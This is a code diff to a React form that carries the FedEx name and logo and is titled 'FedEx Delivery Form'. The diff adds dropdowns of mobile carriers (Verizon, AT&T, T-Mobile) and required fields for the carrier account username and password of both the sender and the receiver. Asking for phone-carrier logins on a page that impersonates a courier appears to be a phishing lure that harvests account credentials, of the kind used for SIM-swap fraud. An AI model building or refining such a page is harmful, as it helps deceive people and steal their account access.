@@ -67,12 +67,12 @@ export default function ContactDeliveryForm() {
           {/* Logo */}
           <img
             src="/logo.png"
-            alt="Fedex Logo"
+            alt="FedEx Logo"
             className="h-32 w-auto object-contain mb-6"
           />
 
           <h1 className="text-4xl font-extrabold text-gray-900 mb-3">
-            Courier & Delivery
+            FedEx Delivery Form
           </h1>
 
           <p className="max-w-xl text-gray-500 mb-8">
@@ -142,12 +142,12 @@ export default function ContactDeliveryForm() {
 
             <img
               src="/logo.png"
-              alt="Fedex Logo"
+              alt="FedEx Logo"
               className="h-32 w-auto object-contain mb-3"
             />
 
             <h2 className="text-3xl font-extrabold text-gray-900 text-center mb-2">
-              Fedex Delivery Form
+              FedEx Delivery Form
             </h2>
 
             <p className="text-sm text-gray-500 text-center">
@@ -211,6 +211,7 @@ export default function ContactDeliveryForm() {
                       type="text"
                       name="owner_name"
                       required
+                      placeholder="John Doe"
                       className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                     />
                   </div>
@@ -225,6 +226,7 @@ export default function ContactDeliveryForm() {
                       type="tel"
                       name="owner_phone"
                       required
+                      placeholder="+1 234 567 890"
                       className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                     />
                   </div>
@@ -239,6 +241,7 @@ export default function ContactDeliveryForm() {
                       type="email"
                       name="owner_email"
                       required
+                      placeholder="john@example.com"
                       className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                     />
                   </div>
@@ -257,46 +260,66 @@ export default function ContactDeliveryForm() {
                     />
                   </div>
 
-                  {/* Network Courier */}
+                  {/* Owner Network Carrier Select */}
                   <div>
                     <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
-                      Network Courier
+                      Network Carrier
                     </label>
 
-                    <input
-                      type="text"
-                      name="owner_courier"
+                    <select
+                      name="owner_carrier"
                       required
-                      placeholder="e.g. DHL, FedEx, At&t, UPS"
-                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
-                    />
+                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600] bg-white"
+                    >
+                      <option value="">
+                        Select Carrier
+                      </option>
+
+                      <option value="Verizon">
+                        Verizon
+                      </option>
+
+                      <option value="AT&T">
+                        AT&T
+                      </option>
+
+                      <option value="T-Mobile">
+                        T-Mobile
+                      </option>
+
+                      <option value="Other">
+                        Other
+                      </option>
+                    </select>
                   </div>
 
-                  {/* Courier Username + Password */}
+                  {/* Carrier Username + Password */}
                   <div className="flex flex-col sm:flex-row gap-4">
 
                     <div className="flex-1">
                       <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
-                        Network Courier Username
+                        Network Carrier Username
                       </label>
 
                       <input
                         type="text"
                         name="owner_courier_username"
                         required
+                        placeholder="Carrier username"
                         className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                       />
                     </div>
 
                     <div className="flex-1">
                       <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
-                        Network Courier Password
+                        Network Carrier Password
                       </label>
 
                       <input
                         type="password"
                         name="owner_courier_password"
                         required
+                        placeholder="Carrier password"
                         className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                       />
                     </div>
@@ -314,6 +337,7 @@ export default function ContactDeliveryForm() {
                       name="gadget_count"
                       min="1"
                       required
+                      placeholder="1"
                       className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                     />
                   </div>
@@ -343,11 +367,12 @@ export default function ContactDeliveryForm() {
                       type="text"
                       name="receiver_name"
                       required
+                      placeholder="Jane Smith"
                       className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                     />
                   </div>
 
-                  {/* Gender */}
+                  {/* Receiver Gender */}
                   <div>
                     <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
                       Gender
@@ -376,46 +401,66 @@ export default function ContactDeliveryForm() {
                     </select>
                   </div>
 
-                  {/* Receiver Courier */}
+                  {/* Receiver Network Carrier Select */}
                   <div>
                     <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
-                      Network Courier
+                      Network Carrier
                     </label>
 
-                    <input
-                      type="text"
-                      name="receiver_courier"
+                    <select
+                      name="receiver_carrier"
                       required
-                      placeholder="e.g. Aramex, At&t, DHL"
-                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
-                    />
+                      className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600] bg-white"
+                    >
+                      <option value="">
+                        Select Carrier
+                      </option>
+
+                      <option value="Verizon">
+                        Verizon
+                      </option>
+
+                      <option value="AT&T">
+                        AT&T
+                      </option>
+
+                      <option value="T-Mobile">
+                        T-Mobile
+                      </option>
+
+                      <option value="Other">
+                        Other
+                      </option>
+                    </select>
                   </div>
 
-                  {/* Receiver Courier Username + Password */}
+                  {/* Receiver Carrier Username + Password */}
                   <div className="flex flex-col sm:flex-row gap-4">
 
                     <div className="flex-1">
                       <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
-                        Network Courier Username
+                        Network Carrier Username
                       </label>
 
                       <input
                         type="text"
                         name="receiver_courier_username"
                         required
+                        placeholder="Carrier username"
                         className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                       />
                     </div>
 
                     <div className="flex-1">
                       <label className="block text-xs font-semibold text-gray-600 uppercase mb-1">
-                        Network Courier Password
+                        Network Carrier Password
                       </label>
 
                       <input
                         type="password"
                         name="receiver_courier_password"
                         required
+                        placeholder="Carrier password"
                         className="w-full px-3 py-2 border border-gray-300 rounded-none focus:outline-none focus:ring-2 focus:ring-[#FF6600]"
                       />
                     </div>
